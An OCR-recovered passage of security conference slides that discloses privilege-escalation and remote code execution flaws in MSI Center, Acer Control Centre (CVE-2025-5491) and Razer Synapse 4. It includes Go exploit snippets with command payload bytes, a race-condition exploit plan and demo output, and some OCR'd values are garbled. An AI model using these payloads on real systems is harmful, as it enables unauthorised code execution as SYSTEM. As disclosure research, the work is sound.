private static void Record Flow Ticks(strins FlowID)
```

## Slide 102

#### `Handling Socket Data`

• `CS_CommonAPI.C_Server::Launch_Server()`

- `CS_CommonAPI.C_Server::Callback_Accept()`

- `CS_CommonAPI.C_Server::Callback_Read()`

- `MSI.CentralServer.C_Features::DataResponse (CS_CommonAPI.Struct_RequestData)`

\```
MSI Center
\```

## Slide 103

\```
Protocol Commands
CMD_Reboot = { 5, 3, 1, 8, 255, 0, 0, 1 }
CMD_Uninstall = { 5, 3, 1, 8, 255, 255, 255, 254 }
...
\```

\```
MSI Center
\```

## Slide 104

\```
Matching Protocol Commands
if (C_API.CompareBytes(Data, CMD_Reboot)) {}
\```

\```
MSI Center
\```


> Recovered by OCR — confidence 80/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Matching Protocol Commands
bool flaga@ = C_API.CompareBytes(RequestData.Data, C_Features.CMD Reboot) == 0;
if (flag4e)
{
for (int i = 0; i < DataCenter.DynamicLoading.List_IPlugin_SDK.Count; i++)
{
bool flag41 = DataCenter.DynamicLoading.List_IPlugin_SDK[i]._IPlugin != r
if (flag41)
{
} HSI Center
```

## Slide 105

\```
MSI Center
\```


> Recovered by OCR — confidence 84/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
bool flag4@ = C_API.CompareBytes(RequestData.Data, C_Features.CMD_ Reboot) == Q;
if (flag4e@)
{
for (int i = 03; i < DataCenter.DynamicLoading.List_IPlugin_SDK.Count; i++)
{
| bool flag41 = DataCenter.DynamicLoading.List_IPlugin_SDK[i]._IPlugin != null
if (flag41)
{
}
}
new Process
{
StartiInfo =
{
FileName = "shutdown.exe",
Arguments = "-r -f -t 2",
UseShellExecute = false,
CreateNoWindow = true
}.Start();
```

## Slide 106

#### `One sock.send() to reboot`

\```
// CMD_Reboot = 5, 3, 1, 8, 255, 0, 0, 1
var payload = []byte{
0x05, 0x03, 0x01, 0x08, 0xff, 0x00, 0x00, 0x01
}
\```

\```
conn, _ := net.Dial("tcp", remote)
_, err = conn.Write(payload)
// send, and nothing happens :(
\```

\```
MSI Center
\```

## Slide 107

\```
0x0f, 0x27, 0x00, 0x00, 0x05,
0x03, 0x01, 0x08, 0xff, 0x00,
0x00, 0x01
\```

\```
MSI Center
\```

## Slide 108

#### `One sock.send() to reboot`

\```
// CMD_Reboot = 5, 3, 1, 8, 255, 0, 0, 1
\```

\```
var payload = []byte{
0x0f, 0x27, 0x00, 0x00,
0x05, 0x03, 0x01, 0x08, 0xff, 0x00, 0x00, 0x01
}
\```

\```
conn, _ := net.Dial ("tcp", remote)
_, err = conn.Write(payload)
\```

\```
MSI Center
\```

## Slide 109

\```
MSI Center
\```

## Slide 110

#### `With one sock.send()`

- `Another way to reboot your computer.`

- `Can interact with a privileged process.`

\```
MSI Center
\```

## Slide 111

###### `MSI Center: Software Architecture`

\```
MSI Center
\```

## Slide 112

#### `Component Loader`

- `Scan program directory for .dll’s matching API_*.dll.`

- `Try and load a target DLL and get a handle on a component specific entry point.`

- `Init and register the DLL as a component.`

\```
MSI Center
\```

## Slide 113

#### `Component -> Command Map`

• `Components have a unique ID`

• `Components implement unique commands`

• `TCP data frame starts with a component ID, followed by a command.`

## Slide 114

#### `Transfer_Command(data)`

\```
MSI Center
\```


> Recovered by OCR — confidence 80/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Transfter_Command( data)
int num5 = DataCenter.DynamicLoading.List_IPlugin_SDK.FindIndex((Struct_IPlugin_SDK x) => x.ID == RequestData.DestID);
bool flag81 = num5 > -13
if (flag81)
{
bool flag82 = DataCenter.DynamicLoading.List_IPlugin_SDK[num5]. IPlugin != null;
if (flags2)
{
return DataCenter.DynamicLoading.List_IPlugin SDK[num5]. IPlugin.Transfer_Command(RequestData. Data) ;
}
MSI Center
```

## Slide 115

## `LPE 1 in MSI Center`

\```
MSI Center
\```

## Slide 116

#### `CMD_AutoUpdateSDK`

- `In the “main” module: MSI.CentralServer (id: 0x0f, 0x27, 0x00, 0x00)`

- `Accepted two comma separated arguments`

   - `A target program`

   - `Arguments for it`

- `:)`

\```
MSI Center
\```

## Slide 117

#### `CMD_AutoUpdateSDK - Flow`

\```
The $target is copied to:
C:\Windows\Temp\MSI Center SDK.exe
\```

\```
CS_CommonAPI.EX_Task::ExecuteTask(
stringRunExePath,
stringRunArguments,...,
boolIsSupervisor=true,...
)
\```

\```
MSI Center
\```

## Slide 118

#### `Code Signing Check`

\```
Call Native DLL for WinVerifyTrust()
\```

\```
MSI Center
\```


> Recovered by OCR — confidence 85/100 on the text kept, 66/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Code Signing Check
Call Wative OLL for WinVerifyTrustt)
if (eax_5 == 0x800b0100)
| GetLastError();
int32_t var_40_1 = 2;
WinVerifyTrust(nullptr, &pgActionID, &pWVTData) ; HSI Center
```

## Slide 119

\```
MSI Center
\```

## Slide 120

\```
MSI Center
\```

## Slide 121

#### `CMD_AutoUpdateSDK Revisited`

1
Copy Target

\```
MSI Center
\```

## Slide 122

#### `CMD_AutoUpdateSDK Revisited`

1
Copy Target

###### `C:\Users\public\prog.exe -> C:\Windows\Temp\MSI Center SDK.exe`

\```
MSI Center
\```

## Slide 123

#### `CMD_AutoUpdateSDK Revisited`

1 2
Copy Target > Verify Target

\```
MSI Center
\```

## Slide 124

#### `CMD_AutoUpdateSDK Revisited`

1 2
Copy Target > Verify Target
WinVerifyTrust() -> C:\Windows\Temp\MSI Center SDK.exe

\```
MSI Center
\```

## Slide 125

#### `CMD_AutoUpdateSDK Revisited`

1 2 3
Copy Target > Verify Target > Schedule Task

\```
MSI Center
\```

## Slide 126

#### `CMD_AutoUpdateSDK Revisited`

1 2 3
Copy Target > Verify Target > Schedule Task

###### `C:\Windows\Temp\MSI Center SDK.exe as SYSTEM`

\```
MSI Center
\```

## Slide 127

#### `CMD_AutoUpdateSDK Revisited`

1 2 3
Copy Target > Verify Target > Schedule Task
4
Run Task
(SYSTEM)

\```
MSI Center
\```

## Slide 128

#### `CMD_AutoUpdateSDK Revisited`

1 2 3
Copy Target > Verify Target > Schedule Task
4
Run Task

\```
MSI Center
\```

## Slide 129

#### `CMD_AutoUpdateSDK Revisited`

1 2 3
Copy Target > Verify Target > Schedule Task
Race Condition
4
Run Task

\```
MSI Center
\```

## Slide 130

#### `CMD_AutoUpdateSDK Revisited`

1
Copy Target

\```
>
\```

\```
C:\Users\public\pwn.exe
C:\...\MSI Center\MSI.ToastServer.exe
\```

\```
MSI Center
\```

## Slide 131

#### `CMD_AutoUpdateSDK Revisited`

1
Copy Target

\```
>
\```

\```
C:\Users\public\pwn.exe
C:\...\MSI Center\MSI.ToastServer.exe
\```

4
Run Task

\```
>
C:\Windows\Temp\MSI Center SDK.exe
\```

\```
MSI Center
\```

## Slide 132

#### `Exploit Plan`

- `Race to Execute()`

- `Thread 1 loops legit MSI.ToastServer.exe`

- `Thread 2 loops malicious pwn.exe`

- `Scheduled task runs MSI Center SDK.exe not knowing which one is malicious.`

\```
MSI Center
\```

## Slide 133

\```
Local Privilege
Escalation 1 - DEMO
MSI Center v2.0.48.0
\```

## Slide 134


> Recovered by OCR — confidence 92/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
MSI Center
- x
BY Windows PowerShell x + vy
PS C:\Users\user.PLAK\Desktop> |
Version 2.0.48.0
Copyright © 2024 Micro-Star INT'L C
D. All rights reserved
Pr policy | Terms | ite | Open source |
CD Allow MSI to collect, process, and use your product information in order to improve your user experience.
```

## Slide 135

## `LPE 2 in MSI Center`

\```
MSI Center
\```

## Slide 136

#### `CMD_Common_RunAMDVbFlashSetup`

\```
Lived in API_Support.dll
\```

\```
Uses ExecuteTask(), but its own implementation.
API_Support.EX_Task::ExecuteTask and not
CS_CommonAPI.EX_Task::ExecuteTask
\```

\```
MSI Center
\```

## Slide 137

\```
API_Support.Ex_Task::ExecuteTask had no
signature validation.
\```

\```
MSI Center
\```


> Recovered by OCR — confidence 86/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Signature validation,
// Token: @x@6000121 RID: 289 RVA: @x000Q@3AD4 File Offset: @xe0ee1CD4
public static int ExecuteTask(string RunExePath, string RunArguments, string TaskName, string UserName =
{
int num = @;
global::TaskScheduler.ITaskService taskService = null;
try
{
C_Log.Print(string.Format("Execute : {0} , {1} ({2})", RunExePath, RunArguments, SetupType) );
taskService = (global::TaskScheduler.TaskScheduler)Activator.CreateInstance(Marshal.GetTypeFromCLSI!
taskService.Connect(Type.Missing, Type.Missing, Type.Missing, Type.Missing);
bool connected = taskService.Connected;
if (connected)
{
global::TaskScheduler.ITaskFolder taskFolder = null;
global::TaskScheduler.ITaskDefinition taskDefinition = null;
global::TaskScheduler.ITriggerCollection triggerCollection = null;
global::TaskScheduler.ITrigger trigger = null;
global::TaskScheduler.ITActionCollection actionCollection = null;
global::TaskScheduler.IAction action = null; Mi
H
a
```

## Slide 138

#### `LPE 2 Exploit`

\```
func lpe2(path string) {
\```

\```
// API_Support ID: []byte{0xca, 0x00, 0x00, 0x00}
// invoking CMD_Common_RunAMDVbFlashSetup
\```

\```
data := cmdForId(API_Support, []byte{
\```

\```
5, 3, 1, 8, 1, 0, 3, 3
\```

\```
})
\```

\```
data = append(data, []byte(path)...)
\```

\```
sendPayload(data)
}
\```

\```
MSI Center
\```

## Slide 139

#### `MSI Center Summary`

- `Another way to reboot your computer or execute code in a privileged context.`

- `Comes pre-installed with some laptops.`

- `More misuse of an “Unauthenticated” RPC mechanism.`

\```
MSI Center
\```

## Slide 140

\```
Acer Control Centre
CVE-2025-5491
\```

## Slide 141

\```
Acer Control Centre
\```

## Slide 142

#### `No TCP Service, but a Named Pipe`

\```
Acer Control Centre
\```


> Recovered by OCR — confidence 91/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Ho TCP Service, but a Hamed Pipe
® ACCSvc.exe:4004 Properties O x \Device\NamedPipe\treadstone_service_LightMode Proper...
Services Threads TCP/IP Security Environment Job Strings Details Security
Image Performance Performance Graph Disk and Network GPU Graph
Basic Information
Image File
Version: 4.0.3054.0 Description: A disk file, communications endpoint, or driver interface.
Build Time: Fri Feb 3 09:04:34 2023 Address: OxFFFF98054825EC10
Path:
C:\Program Files (x86)\Acer\ControlCenter\ACCSvc.exe Explore
ACCSvec Name: \Device\NamedPipe\treadstone_service_LightMode
Type: File
References Quota Charges
Command line:
"C:\Program Files (x86)\Acer\ControlCenter\ACCSvc.exe"
Current directory: Handles: 1 Non-Paged: 384
C:\Windows\System32\
References: 65536 Paged: 1024
Autostart Location:
HKLM\System\CurrentControlSet\Services\ACCSvc Explore
Parent: services.exe(888)
User: NT AUTHORITY\SYSTEM
Started: 11:09:06 2025/07/08 Image: 64-bit
Verify
Bring to Front
| Kill Process
Comment:
mtral Centre
```

## Slide 143

#### `Client & Server Architecture`

\```
ACCSvc.exe
NT AUTHORITY\SYSTEM,
Native Binary
\```

\```
ACCStd.exe
Normal User,
.Net Binary
\```

\```
Acer Control Centre
\```

## Slide 144

#### `Client & Server Architecture`

\```
ACCSvc.exe
treadstone_service
NT AUTHORITY\SYSTEM,
_LightMode
Native Binary
\```

\```
ACCStd.exe
Normal User,
.Net Binary
\```

\```
Acer Control Centre
\```

## Slide 145

#### `Client & Server Architecture`

\```
SendCommandByNamedPipe(
pipe, 7, {target, 113}
)
\```

\```
Acer Control Centre
\```

## Slide 146

#### `Client & Server Architecture`

\```
ACCSvc.exeACCStd.exe
treadstone_service
NT AUTHORITY\SYSTEM,Normal User,
_LightMode
Native Binary.Net Binary
\```

\```
Acer Control Centre
\```

## Slide 147

#### `Client & Server Architecture`

\```
<---- 7, {target, 113}
\```

\```
ACCSvc.exe
NT AUTHORITY\SYSTEM,
Native Binary
\```

\```
ACCStd.exe
treadstone_service
Normal User,
_LightMode
.Net Binary
\```

\```
Acer Control Centre
\```

## Slide 148

#### `Client & Server Architecture`

\```
<---- 7, {target, 113}
ACCSvc.exeACCStd.exe
treadstone_service
NT AUTHORITY\SYSTEM,Normal User,
_LightMode
Native Binary.Net Binary
\```

\```
CreateProcessAsUser(…, target, …)
\```

\```
Acer Control Centre
\```

## Slide 149

\```
Acer Control Centre
\```


> Recovered by OCR — confidence 91/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
BY Windows PowerShell x + v
PS C:\Users\user.PLAK\source\repos\acerpwn\acerpwn\bin\Release> .\acerpwn.exe C:\Windows\System32\notepad.exe
Attempting to run C:\Windows\System32\notepad.exe on ....
Connecting to: .
Running: C:\Windows\System32\notepad.exe
Done! Cleaning up.
PS C:\Users\user.PLAK\source\repos\acerpwn\acerpwn\bin\Release>
B Untitled x
File Edit View
100% Windows (CRLF) UTF-8
Acer Control Centre
```

## Slide 150

#### `Guests get FILE_ALL_ACCESS`

\```
Acer Control Centre
\```


> Recovered by OCR — confidence 89/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Guests get FILE_ALL_ACCESS
PS C:\Users\user.PLAK\Downloads\SysinternalsSuite> .\accesschk.exe -Liv \\.\pipe\treadstone_service_LightMode
Accesschk v6.15 - Reports effective permissions for securable objects
Copyright (C) 2006-2022 Mark Russinovich
Sysinternals — www.sysinternals.com
Error: \\.\pipe\treadstone_service_LightMode has a non-canonical DACL:
Explicit Deny after Explicit Allow
DESCRIPTOR FLAGS:
[SE_DACL_PRESENT ]
[SE_SACL_PROTECTED]
[SE_SELF_RELATIVE]
[0] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Guests
[OBJECT_INHERIT_ACE]
[CONTAINER_INHERIT_ACE]
FILE_ALL_ACCESS
```

## Slide 151

#### `Guests get FILE_ALL_ACCESS`

\```
No LPE...
but RCE!
\```

\```
Acer Control Centre
\```


> Recovered by OCR — confidence 89/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Guests get FILE_ALL_ACCESS
PS C:\Users\user.PLAK\Downloads\SysinternalsSuite> .\accesschk.exe -Liv \\.\pipe\treadstone_service_LightMode
Accesschk v6.15 - Reports effective permissions for securable objects
Copyright (C) 2006-2022 Mark Russinovich
Sysinternals — www.sysinternals.com
Error: \\.\pipe\treadstone_service_LightMode has a non-canonical DACL:
Explicit Deny after Explicit Allow
DESCRIPTOR FLAGS:
[SE_DACL_PRESENT ]
[SE_SACL_PROTECTED]
[0] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Guests
[OBJECT_INHERIT_ACE]
[CONTAINER_INHERIT_ACE]
FILE_ALL_ACCESS
Acer Control Centre
```

## Slide 152

\```
Remote Code Execution
- DEMO
\```

\```
Acer Control Centre v4.00.3054.0
\```

## Slide 153


> Recovered by OCR — confidence 88/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
BY Windows PowerShell x +\|v
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.
a x
Install the latest PowerShell for new features and improvements! https://a
ka.ms/PSWindows
PS C:\Users\user> |
10:42 PM
2/21/2025
BY Windows PowerShell x +\v
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.
Install the Latest PowerShell for new features and improvements! https://a
ka.ms/PSWindows
Ps C:\Users\user.PLAK> ipconfig
Windows IP Configuration
Ethernet adapter Ethernet:
Connection-specific DNS Suffix
IPv6 Address.
Temporary IPv6 Address.
Link-local IPv6 Address .
IPv4 Address.
Subnet Mask .
Default Gateway .
Ethernet adapter Ethernet 2:
Connection-specific DNS Suffix
IPv6 Address. 0 0 0
Temporary IPv6 Address.
Link-local IPv6 Address .
IPv4 Address.
Subnet Mask .
Default Gateway . 0
Ps C:\Users\user.PLAK>
: Localdomain
: fe80: :a6c7:d717:3b33:7515%12
: 10.211.55.13
: 255.255.255.0
: Localdomain
: fdb2:2c26:f4e4:1:82d3:9c5:6105: 8bad
: fdb2:2c26:f4e4:1:3c7d:e3a9:1c8c: 368
: fe80::e3b6:bFfOb: 5559: 7644%5
: 10.37.129.5
```

## Slide 154

- `Why would ACCSvc.exe run as SYSTEM, but execute code as a normal user?`

- `What exactly is that 113 used in SendCommandByNamedPipe?`

- `What other commands exist beyond command 7?`

\```
Acer Control Centre
\```

## Slide 155

#### `7 as a command number`

\```
Acer Control Centre
\```


> Recovered by OCR — confidence 71/100 on the text kept, 66/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
140032a48 wchar16 const (* data_14@032a48)[@x1d] = data_14003236@ {u"treadst
140032a5@ void* data_140032a50 = sub_1400082b0
140032a58 void* data_140032a58 = sub_140008530
140032a68 void* data_140032a68 = sub_1400086bd
140032a78 void* data_140032a78 = sub_140008920
140032a86 void* data_140032a8@ = sub_140008a80
140032a88 void* data_140032a88 = runCommand
140032a9@ wchar16 const (* data_14@032a9@)[@x1d] = data_14003236@ {u"treadst
```

## Slide 156

#### `Frida to Trace Commands`

\```
Interceptor.attach(TARGET(0x1400082b0), { onEnter(args) { … }});
Interceptor.attach(TARGET(0x140008530), { onEnter(args) { … }});
Interceptor.attach(TARGET(0x1400085f0), { onEnter(args) { … }});
Interceptor.attach(TARGET(0x1400086b0), { onEnter(args) { … }});
Interceptor.attach(TARGET(0x140008810), { onEnter(args) { … }});
Interceptor.attach(TARGET(0x140008920), { onEnter(args) { … }});
Interceptor.attach(TARGET(0x140008a80), { onEnter(args) { … }});
Interceptor.attach(TARGET(0x140008a88), { onEnter(args) { … }});
\```

\```
Acer Control Centre
\```

## Slide 157

\```
Acer Control Centre
\```

## Slide 158

#### `Command 7 - Revisited`

\```
int64_t sub_140007570(
PWSTR arg1,  <--- Target Process Path
int64_t arg2,
PROCESS_INFORMATION* arg3,
int32_t arg4<--- Number 113
)
\```

\```
Acer Control Centre
\```

## Slide 159

#### `Command 7 - Revisited`

\```
0x72 == 114
\```

\```
Acer Control Centre
\```

## Slide 160

#### `Command 7 - Revisited`

\```
0x3000 == 12288
\```

\```
S-1-16-12288 == ML_HIGH [0]
\```

\```
[0] https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/81d92bba-d22b-4a8c-908a-554ab29148ab
\```

## Slide 161

#### `Command 7 - Revisited`

\```
113 = Normal User Context
114 = Elevated User Context
\```

\```
Acer Control Centre
\```

## Slide 162

\```
Command 7 - Revisited
target = “\some\payload.exe”
SendCommandByNamedPipe(
pipe, 7, {target, 114}
)
\```

\```
Acer Control Centre
\```

## Slide 163

#### `Notepad as SYSTEM`

\```
Acer Control Centre
\```


> Recovered by OCR — confidence 83/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Hotepad as SYSTEM
Process CPU! Private Bytes Working Set PID| Description |Company Name Image Type User Name
[™ |svchost.exe 3 684 K 17508 K 12604 Host Process for Windows Services Microsoft Corporation 64-bit NT AUTHORITY\SYSTEM
[g ACCSvc.exe 16 952 K 60128K 3396ACCSvc Acer Incorporated 64-bit NT AUTHORITY\SYSTEM
| notepad.exe 3 384 K 18 428K 14460 Notepad Microsoft Corporation 64-bit NT AUTHORITY\SYSTEM
(™ |svchost.exe 1 408 K 8 152K 10840 Host Process for Windows Services Microsoft Corporation 64-bit NT AUTHORITY\LOCAL S
F=) Command Prompt x + |v —
cC:\Users\user.PLAK\source\repos\acerpwn\acerpwn\bin\Release>.\acerpwn.exe . c:\windows\system32\notepad.exe
Attempting to run c:\windows\system32\notepad.exe on ....
Connecting to:
Running: c:\windows\system32\notepad. ex
Done! Cleaning up. File Edit Format View Help
A new version of Notepad is available. | Launch
Untitled - Notepad
Acer Control Centre
```

## Slide 164

\```
Yes, it
works
remotely
too :)
\```

\```
Acer Control Centre
\```

## Slide 165

#### `Acer Control Centre Summary`

- `No reboot POC, but a way to execute code in a privileged context, remotely.`

- `Comes pre-installed with some laptops.`

- `While not TCP, poorly privileged Named Pipe is effectively the same as listening on 0.0.0.0.`

\```
Acer Control Centre
\```

## Slide 166

\```
Razer Synapse 4
CVE-2025-27811
\```

## Slide 167

\```
Razer Synapse 4
\```


> Recovered by OCR — confidence 87/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Cc RAZER SYNAPSE + 3
DASHBOARD GAMER ROOM DEVICES & MODULES GLOBAL SHORTCUTS
|
vy DEVICES
NO DEVICE FOUND
VIEW COMPATIBLE DEVICES
VISIT RAZER STORE
vy YOU MIGHT BE INTERESTED IN ?
9
=.
RAZER COBRA PRO RAZER DEATHSTALKER V2 PRO RAZER KRAKEN V4
```

## Slide 168

#### `The cost of fiddling with your RGB`


> Recovered by OCR — confidence 92/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
The cost of fiddling with
4s) GameManagerService3.exe
i |razer_elevation_service.exe
@ RazerAppEngine.exe
@ RazerAppEngine.exe
@ RazerAppEngine.exe
@ RazerAppEngine.exe
@ RazerAppEngine.exe
@ RazerAppEngine.exe
@ RazerAppEngine.exe
@ RazerAppEngine.exe
@ RazerAppEngine.exe
@ RazerAppEngine.exe
@ RazerAppEngine.exe
RzAppManager
RzBTLEManager
RzChromaConnectManager
RzChromaConnectServer
RzDeviceManager
RzDiagnostic
RzloTDeviceManager
RzSmartlightingDeviceManager
< 0.01 98 236 K
0.25 310 800 K
67 116K
6 464K
5 832K
< 0.01 6 852 K
5712K
< 0.01 6 204K
7 332K
158 656 K
440 616K
163 268 K
155 176 K
138 860 K
126 436 K
146 904 K
140 504 K
119 060 K
182 276 K
3964 GameManagerService3
14428 Razer Elevation Service
12408 RazerAppEngine
12876 RazerAppEngine
13056 RazerAppEngine
13080 RazerAppEngine
13184 RazerAppEngine
3584 RazerAppEngine
10244 RazerAppEngine
11148 RazerAppEngine
11560 RazerAppEngine
2496 RazerAppEngine
8124 RazerAppEngine
4432 Razer Chroma SDK Service Host
4852 Razer Chroma SDK Service Host
3612 Razer Chroma SDK Service Host
5140 Razer Chroma SDK Service Host
2580 Razer Chroma Stream Server
5168 Razer Chroma SDK Service Host
5200 Razer Chroma SDK Service Host
5252 Razer Chroma SDK Service Host
4188 Razer Chroma SDK REST Server
4172 Razer Chroma SDK Service
5304 Razer Chroma SDK Service Host
Razer Inc
Razer Inc
Razer Inc.
Razer Inc.
Razer Inc.
Razer Inc.
Razer Inc.
Razer Inc.
Razer Inc.
Razer Inc.
Razer Inc.
Razer Inc.
Razer Inc.
Razer Inc.
Razer Inc.
Razer Inc.
Razer Inc.
Razer Inc.
Razer Inc.
Razer Inc.
Razer Inc.
Razer Inc.
Razer Inc.
Razer Inc.
32-bit NT AUTHORITY\SYSTEM
64-bit NT AUTHORITY\SYSTEM
64-bit PLAK\user
64-bit PLAK\user
64-bit PLAK\user
64-bit PLAK\user
64-bit PLAK\user
64-bit PLAK\user
64-bit PLAK\user
64-bit PLAK\user
64-bit PLAK\user
64-bit PLAK\user
64-bit PLAK\user
32-bit NT AUTHORITY\SYSTEM
32-bit NT AUTHORITY\SYSTEM
32-bit NT AUTHORITY\SYSTEM
32-bit NT AUTHORITY\SYSTEM
32-bit NT AUTHORITY\SYSTEM
32-bit NT AUTHORITY\SYSTEM
32-bit NT AUTHORITY\SYSTEM
32-bit NT AUTHORITY\SYSTEM
32-bit NT AUTHORITY\SYSTEM
32-bit NT AUTHORITY\SYSTEM
"C:\Program Files (x86)\Ri
"C:\Program Files\Razer\r:
--url-params=apps=synaf
"C:\Program Files\Razer\F
"C:\Program Files\Razer\F
"C:\Program Files\Razer\F
"C:\Program Files\Razer\F
"C:\Program Files\Razer\F
"C:\Program Files\Razer\F
"C:\Program Files\Razer\F
"C:\Program Files\Razer\F
"C:\Program Files\Razer\F
"C:\Program Files\Razer\F
-sve "RzAppManager" -f "
-sve "RZBTLEManager" -f
-sve "RzChromaConnectN
-sve "RzChromaConnectS
"C:\Program Files (x86)\Ri
-sve "RzDeviceManager' -
-sve "RzDiagnostic" -f "C:\
-sve "RzloTDeviceManage
"C:\Program Files (x86)\Ri
"C:\Program Files (x86)\Ri
32-bit NT AL -sve "RzSmartlightingDeviceManager" -f "C:\Prog
```

## Slide 169

\```
Razer Synapse 4
\```


> Recovered by OCR — confidence 90/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
H razer_elevation_service.exe:14428 Properties
Image Performance Performance Graph Disk and Network GPU Graph Services
Image File
Version: 1.1.0.5
Build Time: Sun Jun 4 07:00:00 2023
Path:
C:\Program Files\Razer\razer_elevation_service\razer_elevation_service.exe
Razer Elevation Service
Command line:
"C:\Program Files\Razer\razer_elevation_service\razer_elevation_service.exe"
Current directory:
C:\Windows\System32\
Autostart Location:
HKLM\System\CurrentControlSet\Services\Razer Elevation Service
Parent: services.exe(892)
User: NT AUTHORITY\SYSTEM
```

## Slide 170

#### `razer_elevation_service`

- `No listening ports`

- `No named pipes`

- `C++ binary`

\```
Razer Synapse 4
\```

## Slide 171

### `Procmon – Sub Process`

\```
Razer Synapse 4
\```


> Recovered by OCR — confidence 88/100 on the text kept, 79/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
49,8201266
49,8201541
49,8201897
49,8202782
49,8203089
49, 8203181
razer_elevation_service.exe
razer_elevation_service.exe
razer_elevation_service.exe
razer_elevation_service.exe
razer_elevation_service.exe
razer_elevation_service.exe
razer_elevation_service.exe
razer_elevation_service.exe
razer_elevation_service.exe
razer_ elevation _service, exe
RegCloseKey
RegOpenKey
RegOpenKey
QueryNamelnformationFile
10868 [3 RegOpenKey
10868
10868
10868 [=
10868 fH
RegOpenKey
QuerySecurityFile
RegQueryValue
SUB Process
HKLM\System\CurrentControlSet\Services\bam\State\UserSettings\S- 1 5. 21-2937686627- 1104840486- 3429537228- 1104
HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\BAM
HKLM\System\CurrentControlSet\Control\Session Manager\BAM
C:\Users\user.PLAK\AppData\Local\Razer\RazerAppEngine\User Data\Apps\Common\WebAppinstaller\RazerChroma-Web-v4.0.433.exe
C:\Users\user. PLAK\AppData\LocallRazer\RazerAppEngine\User Data\Apps\Common\WebAppinstaller\RazerChroma- -Web-v4.0.433.exe
Appinstaller\RazerChroma-Web-v4.0.433.exe
HKU\S-1-5-18\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
HKU\.DEFAULT\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
HKU\.DEFAULT\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers
C:\Users\user.PLAK\AppData\Local\Razer\RazerAppEngine\User Data\Apps\Common\WebAppinstaller\RazerChroma-Web-v4.0.433.exe
HKLM\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\SdbUpdates
SUCCESS
REPARSE
NAME NOT FO!
SUCCESS
SUCCESS
REPARSE
NAME NOT FO!
NAME NOT FO!
SUCCESS
SUCCESS
NAME NOT FO!
```

## Slide 172

#### `Electron Asar Extraction`

\```
https://www.electronjs.org/docs/latest/tutorial/asar-archives
\```


> Recovered by OCR — confidence 81/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Electron Asar Extraction
> Ls razer-synapse-gui/electron
buildConstants-production. js errorMsgConst. js
Protocol
RzWindowVersion. js
UsbRzDeviceAction. js
WssAction. js
arrayHelper. js
assets
buildConstants-pre-praod. js
>
buildConstants. js
components
constants. js
devtools. js
dirHelper. js
engineversion. js
index.css
index. html
keyStorage. js
Lib
main. js
mainSubFunction. js
nativeNotiFicationHandLer. js
preload. js
resources
serviceFunction. js
```

## Slide 173

\```
Foreign Function Interface
fork of: https://github.com/node-ffi-napi/node-ffi-napi
\```

\```
JavaScript
\```

\```
const res = simpleServiceInitialize(arg1)
\```

\```
node-ffi
\```

\```
simple_service.dll
\```

\```
void simpleServiceInitialize(const * arg1)
\```

\```
Razer Synapse 4
\```

## Slide 174

\```
FFI from Node to simple_service.dll
\```


> Recovered by OCR — confidence 81/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
FFL from Hode to simple_service,dll
[6 driverhubs > razer-pwn > razer-synapse-gui > electron > modules > simple_service > win > (us) index.js > [e] <unknown> > ZY FFISimpleService > Z? initDIl > fei > ZY simpleServicelnitialize
28 module.exports = {
21 FFISimpleService: class {
22 constructor() {
24 }
25 initD1ll = async e => {
26 const s = “initD11(d1l1lName: ${e}) *;
27 if (console. log(*${this.name}.${s}*), e) {
28 if (!t.existsSync(e)) return void console. log(*${s} dll missing:${e} ==><==");
29 const i= {
31 simpleServiceShutdown: ["void", ["pointer"]],
32 isAppsServiceEventRegistered: ["bool", []],
33 registerAppsServiceEvent: ["void", ["pointer"]],
34 unregisterAppsServiceEvent: ["void", ["pointer"]],
35 setAppsServiceEventCallback: ["void", ["pointer", “pointer"]]],
36 simpleGetVersionInfo: ["void", ["pointer"]],
37 simpleGetUserApps: ["void", ["string", “pointer"]],
38 simpleAddUserAppFile: ["void", ["string", "string", "pointer", “uint", "“pointer"]
```

## Slide 175

\```
FFI from Node to simple_service.dll
\```


> Recovered by OCR — confidence 87/100 on the text kept, 76/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
FFL from Hode to simple_service,dll
Exports
Q Search exports
Ordinal Address
29
74
30
65
21
66
22
63
19
« Name B
simpleRemoveUserAppDirectory(char const* __ptr64, ch...
simpleRemoveUserAppFile
simpleRemoveUserAppFile(char const* __ptr64, char co
simpleLaunchUserAppProcess
